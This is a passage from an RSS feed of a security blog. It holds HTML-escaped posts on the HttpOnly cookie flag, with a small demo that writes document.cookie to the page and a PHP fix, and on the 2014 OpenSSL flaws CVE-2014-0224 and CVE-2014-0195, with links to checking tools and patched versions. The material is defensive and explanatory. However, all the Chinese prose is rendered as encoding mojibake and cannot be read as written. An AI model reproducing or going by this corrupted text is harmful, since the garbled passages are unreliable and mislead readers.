        &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;HttpOnly Demo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;If you didn&apos;t set HttpOnly flag, cookie will write down by document.write().&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-unset.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-unset.png&quot; alt=&quot;Êú™Ë®≠ÂÆö HttpOnly ‰πãÂâçÔºåcookie ÂèØË¢´ JavaScript Â≠òÂèñ&quot; title=&quot;Êú™Ë®≠ÂÆö HttpOnly ‰πãÂâçÔºåcookie ÂèØË¢´ JavaScript Â≠òÂèñ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âú®‰∏äÂúñ‰∏≠ÂèØÁúãÂà∞ PHPSESSID Â∑≤ÊàêÂäüË¢´ JavaScript Â≠òÂèñÔºåÈÄô‰πüÊÑèÂë≥ËëóÁ∂≤Á´ôÊúâ XSS Âº±ÈªûÊôÇÔºå‰ΩøÁî®ËÄÖÁöÑË∫´‰ªΩÊúâËºÉÈ´òÁöÑÊ©üÁéáË¢´ÁõúÁî®„ÄÇÁÇ∫‰∫Ü‰ΩøÁî® HttpOnly ÈÄ≤Ë°åÈò≤Ë≠∑ÔºåËÆìÊàëÂÄëÂ∞á PHP Á®ãÂºèÁ¢º‰øÆÊîπÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ini_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;session.cookie_httponly&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-set.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-set.png&quot; alt=&quot;Ë®≠ÂÆö HttpOnly ÂæåÔºåcookie Â∑≤ÁÑ°Ê≥ïË¢´ JavaScript Â≠òÂèñ&quot; title=&quot;Ë®≠ÂÆö HttpOnly ÂæåÔºåcookie Â∑≤ÁÑ°Ê≥ïË¢´ JavaScript Â≠òÂèñ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•‰ΩøÁî®Áï´Èù¢‰∏≠Âè≥‰∏äËßíÁöÑ Chrome &lt;a href=&quot;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&quot;&gt;Edit This Cookie Â•ó‰ª∂&lt;/a&gt; ÁúãÂà∞ HttpOnly Â∑≤Á∂ìË¢´ÂãæÈÅ∏ÔºàÂ¶ÇÁ¥ÖÊ°ÜËôïÔºâÔºå‰∏¶‰∏î PHPSESSID Â∑≤ÁÑ°Ê≥ïË¢´ JavaScript Â≠òÂèñÔºå‰∏çÂ≠òÂú®Êñº HTML ‰∏≠„ÄÇ&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ÁõÆÂâç PHP ÂÆòÊñπÁöÑÊïôÂ≠∏ÊòØÁî® session_set_cookie_params ÈÄôÂÄã functionÔºåÂèØÂèÉËÄÉ&lt;a href=&quot;http://www.php.net/manual/en/function.session-set-cookie-params.php&quot;&gt;ÂÆòÊñπÁ∂≤È†ÅÁöÑÈÄôÁØáË™™Êòé&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;httponly-ÂØ¶Èöõ‰ΩøÁî®Ê°à‰æã&quot;&gt;HttpOnly ÂØ¶Èöõ‰ΩøÁî®Ê°à‰æã&lt;/h3&gt;

&lt;p&gt;Áî±Êñº HttpOnly ÁöÑ‰ΩøÁî®ÊñπÂºèËºÉÁ∞°ÂñÆÔºåÂõ†Ê≠§ÂÉÖÂàóËàâÂπæÂÄãÁ´ôÂè∞ÁöÑ‰ΩøÁî®ÁµêÊûúÂúñÁâáÁµ¶Â§ßÂÆ∂ÂèÉËÄÉÔºåÂ∞±‰∏çÂè¶Â§ñÂ§öÂÅöË™™ÊòéÂõâÔºÅ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;TÂÆ¢ÈÇ¶ (www.techbang.com)ÔºåÊúâË®≠ÂÆö HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot; alt=&quot;TÂÆ¢ÈÇ¶&quot; title=&quot;TÂÆ¢ÈÇ¶&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÊÑõÊñôÁêÜ (icook.tw)ÔºåÊúâË®≠ÂÆö HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot; alt=&quot;ÊÑõÊñôÁêÜ&quot; title=&quot;ÊÑõÊñôÁêÜ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mobile01 (www.mobile01.com)ÔºåÊú™Ë®≠ÂÆö HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Giga Circle (tw.gigacircle.com)ÔºåÊú™Ë®≠ÂÆö HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÁµêË´ñ&quot;&gt;ÁµêË´ñ&lt;/h3&gt;

&lt;p&gt;HttpOnly ÊòØÂ≠òÂú®Â∑≤‰πÖÁöÑÊäÄË°ìÔºå‰ΩÜÂú®ÊàëÂÄë&lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;Á≥ªÂàóÊñáÁ¨¨‰∏ÄÁØá&lt;/a&gt;ÁöÑÁµ±Ë®àÁï∂‰∏≠ÔºåÊé°Áî®ÁöÑÊØî‰æã‰ªçÁÑ∂ÂÅè‰Ωé„ÄÇÂ¶ÇÂêå‰πãÂâçÊàëÂÄëÊèêÂèäÁöÑ &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; ÂïèÈ°åÔºåÂç≥‰Ωø‰∏ÄÈ†ÖË≥áÂÆâÊäÄË°ìÊàñË≥áÂÆâË≠∞È°åÂ≠òÂú®Âæà‰πÖÔºå‰πüÈúÄË¶ÅÂ§ßÂÆ∂ÊåÅÁ∫åÈóúÊ≥®„ÄÇ&lt;/p&gt;

&lt;p&gt;‰ΩÜÂç≥‰ΩøÊé°Áî®‰∫Ü HttpOnlyÔºå‰πüÂÉÖËÉΩÈò≤Ê≠¢ÊÉ°ÊÑè‰∫∫Â£´‰∏çÊ≠£Áï∂Â≠òÂèñ cookieÔºåÁÑ°Ê≥ïÈò≤Á¶¶ÂÖ∂‰ªñÁöÑ XSS ÊîªÊìäÊñπÂºèÔºå‰æãÂ¶ÇÂ∞á‰ΩøÁî®ËÄÖÂ∞éÂêëËá≥Èá£È≠öÁ∂≤Á´ôÈ®ôÂèñÂÄãË≥á„ÄÅÂ∞éÂêëËá≥ÊÉ°ÊÑèÁ∂≤Á´ôÊ§çÂÖ•ÂæåÈñÄ„ÄÅÁΩÆÊèõÁ∂≤È†ÅÂ§ñËßÄÁ≠âÁ≠â„ÄÇÂêåÊôÇÊú™‰æÜ‰ªçÊúâÂèØËÉΩÂá∫ÁèæÊñ∞ÁöÑ XSS ÊîªÊìäÊâãÊ≥ïÔºåÂõ†Ê≠§ÂçÉËê¨Âà•Âõ†Ë®≠ÂÆö‰∫Ü HttpOnly Â∞±Êéâ‰ª•ËºïÂøÉÔºåË™§‰ª•ÁÇ∫‰∏çÊúÉÂÜçË¢´ XSS ÊâãÊ≥ï‰æµÂÆ≥‰ºÅÊ•≠Âà©ÁõäÊàñÁî®Êà∂Ë≥áÊñôÔºå‰ªçÁÑ∂ÂøÖÈ†àË¨πÊÖéÊ™¢Êü•ÊØè‰∏ÄÂÄãÁ≥ªÁµ±Ëº∏Âá∫Ëº∏ÂÖ•ÈªûÔºå‰ª•ÈÅøÂÖçÊú™‰æÜÂõ†‰∏äËø∞ÂΩ±ÈüøÂ∞éËá¥Áî®Êà∂Êàñ‰ºÅÊ•≠ËíôÂèóÊêçÂ§±„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/</link>
                <guid>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</guid>
                <pubDate>Wed, 11 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL ÂÜçÁàÜÂö¥ÈáçÊºèÊ¥ûÔºåÈÉ®ÂàÜÈáçË¶ÅÁ∂≤Á´ô‰ªçÂú®È¢®Èö™‰∏≠ÔºÅ</title>
                <description>&lt;p&gt;(Êú¨ÁØáÊúÄÂæåÊõ¥Êñ∞ÊôÇÈñìÔºö2014.6.9 15:40 pm)&lt;/p&gt;

&lt;p&gt;OpenSSL ÂúòÈöäÊñº 6/5 ‰øÆË£ú‰∫Ü&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;ÂÖ≠È†ÖÂÆâÂÖ®ÊºèÊ¥û&lt;/a&gt;Ôºå&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; Âú®&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;ÈÄôÁØáÊñáÁ´†&lt;/a&gt;‰∏≠Êï¥ÁêÜ‰∫ÜÈÄôÂπæÂÄãÊºèÊ¥ûÁöÑÊëòË¶ÅÔºåÈÄôË£°Êà™ÂúñË°®Ê†ºÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 ÂÆâÂÖ®Êõ¥Êñ∞ÊØîËºÉË°®&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰∏≠ CVE-2014-0224„ÄÅCVE-2014-0195 ÂÖ©È†ÖË¢´ÂàóÁÇ∫ CriticalÔºåÊàëÂÄëÂàÜÂà•‰æÜÁúãÁúãÈÄôÂÖ©ÂÄãÂº±ÈªûÂà∞Â∫ïÈÄ†Êàê‰∫Ü‰ªÄÈ∫ºÂç±ÂÆ≥„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve-2014-0224-ccs-injection-vulnerability&quot;&gt;CVE-2014-0224 (CCS Injection Vulnerability)&lt;/h3&gt;

&lt;h4 id=&quot;Ë™™Êòé&quot;&gt;Ë™™Êòé&lt;/h4&gt;

&lt;p&gt;Âä†ÂØÜÈÄöË®äË¢´Ë¶ñÁÇ∫È†êÈò≤&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&quot;&gt;‰∏≠Èñì‰∫∫ÊîªÊìä&lt;/a&gt;ÁöÑËß£Ê≥ï‰πã‰∏ÄÔºåÂà©Áî® SSL ÂçîÂÆöÈò≤Ê≠¢Á´äËÅΩ„ÄÅÁ´ÑÊîπÂÇ≥Ëº∏Ë≥áÊñôÊòØ‰∏ÄÁ®ÆÂ∏∏Ë¶ãÁöÑÊñπÂºè„ÄÇÁÑ∂ËÄå OpenSSL ÈÄôÊ¨°Âá∫ÁèæÂú® ChangeCipherSpecÔºàÊõ¥ÊîπÂØÜÈë∞Ë¶èÊ†ºÔºâÁöÑË®≠Ë®àÁëïÁñµÔºåËÆìÊîªÊìäËÄÖÊúâËæ¶Ê≥ïËß£ÂØÜÊâÄÊúâÈÄöË®äÂÖßÂÆπÔºåËÆìÂä†ÂØÜ‰øùË≠∑ÂæπÂ∫ïÂ§±Êïà„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë©≤Âº±ÈªûÂéüÁêÜÊòØ OpenSSL ‰º∫ÊúçÂô®Á´ØÂú®ÂØ¶‰Ωú handshake ÊôÇ‰∏¶Êú™Ê™¢Êü•Ë®äÊÅØÁöÑÈ†ÜÂ∫èÔºàÂö¥Ê†º‰æÜË™™ÊòØ ChangeCipherSpec ÁöÑÈ†ÜÂ∫èÔºâÔºåÊâÄ‰ª•ÊîªÊìäËÄÖÂèØ‰ª•ÊèêÂâçÈÄÅÂá∫ ChangeCipherSpec Ë®äÊÅØÔºå‰Ωø‰º∫ÊúçÂô®Âú®ÈÇÑÊú™ÂàùÂßãÂÆåÁï¢ÁöÑÁãÄÊÖãÂÖàÂéªÂÅö ChangeCipherSpec ÁöÑÂãï‰ΩúÔºåÊúÄÁµÇÈÄ†ÊàêÂä†Ëß£ÂØÜÂèØËß£ÁöÑÁãÄÊ≥ÅÔºåÊòØ‰ª•Ê≠§Âº±ÈªûÁ®±‰πãÁÇ∫ CCS Injection„ÄÇÊõ¥Â§öÁöÑÁ¥∞ÁØÄË´ãÂèÉËÄÉÂéüÈÄöÂ†±ËÄÖ Masashi Kikuchi ÁöÑ&lt;a href=&quot;http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html&quot;&gt;ÈÉ®ËêΩÊ†º&lt;/a&gt;Ôºå‰Ωê‰ª•&lt;a href=&quot;https://www.imperialviolet.org/2014/06/05/earlyccs.html&quot;&gt;ÈÄôÁØá&lt;/a&gt;ÈôÑÁ®ãÂºèÁ¢ºÁöÑËß£Ë™™ÔºåOpenSSL github ‰∏äÈóúÊñº CVE-2014-0224 ÁöÑ &lt;a href=&quot;https://github.com/openssl/openssl/commit/a91be10833e61bcdc9002de28489405101c52650&quot;&gt;fix&lt;/a&gt; ‰πüÂèØ‰ª•Âπ´Âä©‰∫ÜËß£„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;Ë™∞ÊáâË©≤Ê≥®ÊÑè&quot;&gt;Ë™∞ÊáâË©≤Ê≥®ÊÑè&lt;/h4&gt;

&lt;p&gt;ÊâÄÊúâÈù† OpenSSL ‰øùË≠∑ÈÄ£Á∑öÁöÑÊáâÁî®ÊúçÂãôÈÉΩÈúÄË¶ÅÊ≥®ÊÑè„ÄÇÂèàÂ∞§ÂÖ∂ÊòØÈäÄË°å„ÄÅÈáëÊµÅÊúçÂãôÈÄô‰∫õÈÄ£Á∑ö‰∏≠Â≠òÂú®ÈáëËûçË≥áË®äÁöÑÊúçÂãôÔºåËã•‰∏çÊ≥®ÊÑèÊúÉÈÄ†Êàê‰ø°Áî®Âç°Âç°ËôüÊ¥©ÊºèÔºåÁ∂≤Ë∑ØÈäÄË°åË¢´ÁõúÁî®„ÄÇÁ∂ìÈÅéÂØ¶ÈöõÊ™¢Ê∏¨Ôºå&lt;strong&gt;ÁõÆÂâç‰ªçÊúâÈäÄË°åÂñÆ‰ΩçÂíåÈáëÊµÅÂñÆ‰Ωç‰ΩøÁî®ÊúâÂïèÈ°åÁöÑ OpenSSL ÁâàÊú¨&lt;/strong&gt;„ÄÇÊ∂àË≤ªËÄÖÈúÄË¶ÅÁâπÂà•Ê≥®ÊÑèÔºåÂú®‰ΩøÁî®Ââç‰πüÂèØÈÄèÈÅé‰∏ãÈù¢Â∞èÂ∑•ÂÖ∑‰æÜËºîÂä©Ê™¢Êü•Ëá™Â∑±ÊâÄ‰ΩøÁî®ÁöÑÊúçÂãô‰ΩøÂê¶Â≠òÂú®È¢®Èö™Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tripwire Êèê‰æõÁöÑ&lt;a href=&quot;http://www.tripwire.com/state-of-security/incident-detection/detection-script-for-cve-2014-0224-openssl-cipher-change-spec-injection/&quot;&gt;Â∞èÁ®ãÂºè&lt;/a&gt; (python)&lt;/li&gt;
  &lt;li&gt;Ê∏¨Ë©¶Á∂≤Á´ô &lt;a href=&quot;http://ccsbug.exposed/&quot;&gt;http://ccsbug.exposed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÊÖ∂Âπ∏ÁöÑÊòØÔºåÊ≠§Âº±ÈªûÂè™ÁôºÁîüÂú®Áî®Êà∂Á´ØÂèä‰º∫ÊúçÂô®Á´ØÁöÜ‰ΩøÁî®ÊúâÂïèÈ°å OpenSSL ÁâàÊú¨ÁöÑÁãÄÊ≥Å‰∏ã„ÄÇ‰∏ÄËà¨‰æÜË™™ÔºåÊ°åÈù¢Á´ØÁöÑÁÄèË¶ΩÂô®ÈÉΩ‰∏çÊòØ‰ΩøÁî® OpenSSLÔºåÊâÄ‰ª•‰∏ÄËà¨‰ΩøÁî®ËÄÖÂèØ‰ª•Á®çÂæÆÂÆâÂøÉ„ÄÇÂïèÈ°åÊØîËºÉÂ§ßÁöÑÊòØ android ‰ΩøÁî®ËÄÖÔºåandroid ÂÖßÂª∫ OpenSSLÔºåË®±Â§ö app ÂëºÂè´ÂÆÉ‰æÜÈÄ≤Ë°åÂä†ÂØÜÂÇ≥Ëº∏ÔºåÊâÄ‰ª•Âª∫Ë≠∞ android Áî®Êà∂Âú® google ÈáãÂá∫Êõ¥Êñ∞ÂâçÔºå‰∏çË¶Å‰ΩøÁî®ÊâãÊ©üÈÄ£Á∑öÂà∞ÊúâÂïèÈ°åÁöÑÊúçÂãôÔºåÊàñ‰ΩøÁî®Ëá™Â∏∂ SSL ÁöÑ appÔºå‰æãÂ¶ÇÔºöfirefox„ÄÅÊúÄÊñ∞Áâà Chrome (35.0.1916.141)‚Ä¶„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÔºåËã•‰ΩøÁî®ËÄÖÂ∏∏Áî®Âà∞‰∏Ä‰∫õÂä†ÂØÜÈÄ£Á∑öÊúçÂãôÔºå‰æãÂ¶Ç VPNÔºåË´ãËá™Ë°åÊ≥®ÊÑèÊâÄ‰ΩøÁî®ËªüÈ´îÊòØÂê¶‰ΩøÁî® OpenSSLÔºå‰ª•ÂÖçÂèóÂà∞ CCS Injection ÁöÑÂΩ±Èüø„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/logo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåË™™ÂÄãÈ°åÂ§ñË©±ÔºåÂéü‰æÜÁèæÂú®ÁôºË°®ÊºèÊ¥ûÈÇÑË¶ÅÁÇ∫ÊºèÊ¥ûÂá∫ÂºµÂúñÔºåÂú® Hacker News ÂéüË®éË´ñ‰∏≤ÁöÑ&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;ÈÄôÁØáÂõûÊáâ&lt;/a&gt;ÔºåÂ∞±Êúâ‰∫∫Ë™™Ôºö„ÄéÈÄôÂÄãÊºèÊ¥ûÊúâ logo ÂóéÔºüÂ¶ÇÊûúÊ≤íÊúâÊàëÂ∞±‰∏çÊâìÁÆóË™çÁúüÁúãÂæÖÂÆÉÔºÅ„ÄèXD&lt;/p&gt;

&lt;h3 id=&quot;cve-2014-0195-dtls-arbitrary-code-execution&quot;&gt;CVE-2014-0195 (DTLS arbitrary code execution)&lt;/h3&gt;

&lt;h4 id=&quot;Ë™™Êòé-1&quot;&gt;Ë™™Êòé&lt;/h4&gt;

&lt;p&gt;OpenSSL Âú®ËôïÁêÜ &lt;a href=&quot;http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security&quot;&gt;DTLS&lt;/a&gt; Ë®äÊÅØ‰∏äÔºåÁÇ∫‰∫ÜÈÅøÂÖç IP fragmentationÔºåÊâÄ‰ª•ÂÅö‰∫Ü‰∏Ä‰∫õËôïÁêÜÊ©üÂà∂ÔºåÈÄôÂÄãËôïÁêÜÊ©üÂà∂‰∏¶Ê≤íÊúâÂ•ΩÂ•ΩÈ©óË≠â DLTS ClientHello ‰∏≠ÁöÑ fragment Èï∑Â∫¶ÔºàÂö¥Ê†º‰æÜË™™ÊòØÂú®Ê≠£Á¢∫ÁöÑ‰ΩçÁΩÆÂÅöÈ©óË≠âÔºâÔºåËã•ÊîªÊìäËÄÖÁôºÈÄÅ‰∏ÄÂÄãÂæàÈï∑ÁöÑ fragmentÔºåËÉΩÈÄ†ÊàêÁ∑©Ë°ùÂçÄÊ∫¢‰ΩçÊîªÊìä„ÄÇÊõ¥Â§öÁöÑÁ¥∞ÁØÄË´ãÂèÉËÄÉ&lt;a href=&quot;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5FqnvmSyD4&quot;&gt;ÈÄôÁØáÊñáÁ´†&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊØîËºÉÊúâË∂£ÁöÑÊòØÈÇ£ÊÆµÂá∫ÂïèÈ°åÁöÑÁ®ãÂºèÁ¢ºÊòØ‰∏Ä‰ΩçÊúâÂêçÂæ∑ÂúãÂ∑•Á®ãÂ∏´ Robin Seggelmann ÂØ´ÁöÑÔºåÊúâÂêçÁöÑÈªûÂú®Êñº‰∏äÊ¨°ÈùûÂ∏∏Âö¥ÈáçÁöÑ &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; ‰∫ã‰ª∂‰πüÊòØ‰ªñÂØ´ÁöÑ code XD&lt;/p&gt;

&lt;h4 id=&quot;Ë™∞ÊáâË©≤Ê≥®ÊÑè-1&quot;&gt;Ë™∞ÊáâË©≤Ê≥®ÊÑè&lt;/h4&gt;

&lt;p&gt;‰ΩøÁî® OpenSSL ‰∏îÊúâÁî®Âà∞ DTLS ÁöÑÊúçÂãôÊèê‰æõËÄÖÔºåÈÄöÂ∏∏ÊòØ VoIP„ÄÅWebRTC„ÄÅVPN ÈÄôÈ°ûÊúçÂãôÔºåÈÄôÂÄãÈ¢®Èö™ÊúâÂèØËÉΩÊúÉÈÄ†Êàê‰º∫ÊúçÂô®Ë¢´ÂÖ•‰æµ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;‰øÆË£ú&quot;&gt;‰øÆË£ú&lt;/h3&gt;

&lt;p&gt;Èô§‰∫Ü‰∏äÈù¢ÊâÄÊèêÂèäÂÖ©ÂÄãÂö¥ÈáçÈ¢®Èö™ÔºåÈÄôÊ¨°ÁöÑÊõ¥Êñ∞‰πüÂêåÊôÇ‰øÆÂæ©‰∫ÜÂπæÂÄã DOS ÁöÑÂº±ÈªûÔºåÂº∑ÁÉàÂª∫Ë≠∞‰º∫ÊúçÂô®Á´ØÊõ¥Êñ∞„ÄÇ
Ë´ãÁ¢∫Ë™ç OpenSSL Â∑≤Á∂ìÊõ¥Êñ∞Âà∞‰∏ãÈù¢ÁâàÊú¨Ôºå‰∏¶‰∏îÊúâÈáçÊñ∞ÂïüÂãïËÆìÂÖ∂ÁîüÊïà„ÄÇ&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;OpenSSL 0.9.8za&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.0m&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.1h&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Êõ¥Êñ∞Ë≥áË®ä‰æùÊìöÊâÄÁî®ÁöÑÁ≥ªÁµ±ÂàÜÂà•Â¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ubuntu.com/usn/usn-2232-1/&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lists.debian.org/debian-security-announce/2014/msg00129.html&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-14:14.openssl.asc&quot;&gt;FreeBSD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lists.centos.org/pipermail/centos-announce/2014-June/020344.html&quot;&gt;CentOS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0624.html&quot;&gt;Red Hat 5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0625.html&quot;&gt;Red Hat 6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/jp/security/security-bulletins/openssl-security-advisory/&quot;&gt;Amazon Linux AMI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Â∞èÁµê&quot;&gt;Â∞èÁµê&lt;/h3&gt;

&lt;p&gt;ÈÄôÊ¨° OpenSSL ÂÅö‰∫ÜÊï∏ÂÄãÂÆâÂÖ®ÊÄßÁöÑÊõ¥Êñ∞ÔºåÈõñÁÑ∂‰∏çËã•&lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;‰πãÂâç Heartbleed ÈÇ£È∫ºÂö¥Èáç&lt;/a&gt;Ôºå‰ΩÜÂçª‰πüËÆì‰ΩøÁî®ËÄÖÊö¥Èú≤Âú®È¢®Èö™‰∏≠„ÄÇÂª∫Ë≠∞Êúâ‰ΩøÁî® OpenSSL ÈÉΩÊáâË©≤Êõ¥Êñ∞Âà∞ÊúÄÊñ∞ÁâàÊú¨ÔºåÂ∞§ÂÖ∂ÊòØ‰∏Ä‰∫õÂ§ßÂûãÁöÑÈäÄË°åÂèäÈáëÊµÅÊúçÂãôÔºåÊõ¥ÊáâÂÑòÈÄüÊõ¥Êñ∞„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/</link>
                <guid>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</guid>
                <pubDate>Mon, 09 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Session ÊîªÊìäËàáÈò≤Ë≠∑</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

